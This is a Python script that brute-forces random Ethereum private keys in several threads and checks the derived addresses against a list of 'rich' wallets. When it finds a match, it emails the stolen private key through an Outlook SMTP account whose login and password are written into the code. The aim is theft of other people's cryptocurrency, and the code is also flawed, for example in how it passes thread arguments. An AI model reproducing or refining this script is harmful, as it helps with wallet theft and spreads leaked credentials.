import smtplib
import multiprocessing
import threading
import codecs,sys
import ecdsa
from Crypto.Hash import keccak
import secrets




def send_email_outlook(content):
    from_addr = 'luckethcoins@outlook.com'
    to_addrs = ['luckethcoin@outlook.com']
    subject = 'lucketh'
    body = content
    server = smtplib.SMTP('smtp.office365.com', 587)
    server.ehlo()
    server.starttls()
    server.login('luckethcoins@outlook.com', 'outlook@sender')
    msg = 'From: {}\r\nTo: {}\r\nSubject: {}\r\n\r\n{}'.format(from_addr, ', '.join(to_addrs), subject, body)
    server.sendmail(from_addr, to_addrs, msg.encode('utf-8'))



def private_to_public(private_key):
    private_key_bytes = codecs.decode(private_key, 'hex')
    key = ecdsa.SigningKey.from_string(private_key_bytes, curve=ecdsa.SECP256k1).verifying_key
    key_bytes = key.to_string()
    public_key = codecs.encode(key_bytes, 'hex')
    return public_key


def public_to_address(public_key):
    public_key_bytes = codecs.decode(public_key, 'hex')
    keccak_hash = keccak.new(digest_bits=256)
    keccak_hash.update(public_key_bytes)
    keccak_digest = keccak_hash.hexdigest()
    # Take last 20 bytes
    wallet_len = 40
    wallet = '0x' + keccak_digest[-wallet_len:]
    return wallet
def generate_address():
    random_bytes = secrets.token_bytes(32)
    private_key = random_bytes.hex()
    public_key=private_to_public(private_key)
    address = public_to_address(public_key)
    return [address,private_key]


def compare_address(num_thread):
    for cycle in range(10000000000000):
        with open("address.json", 'r') as file:
            top_address = file.read().split(',')
        detail = generate_address()
        poor_address = detail[0].lower()
        private_key = detail[1]
        for index ,rich_address in enumerate(top_address):
            print("rich_address: "+rich_address)
            print("poor_address: "+poor_address)

           # print(private_key)
            if poor_address == rich_address:
                contant = [poor_address, private_key]
                send_email_outlook(contant)
                print("$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$")
                sys.exit(1)
            else:
                print("num_thread: "+str(num_thread)+" num_cycle: "+str(cycle)+" num_index: "+ str(index))
                print("^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^")
        file.close()


def compare_address_multi_thread(num_threads):
    threads = []
    for i in range(num_threads):
        print (i)
        t = threading.Thread(target=compare_address,args=(str(i)))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()


if __name__ == '__main__':
    max_thread = multiprocessing.cpu_count()
    compare_address_multi_thread(max_thread)
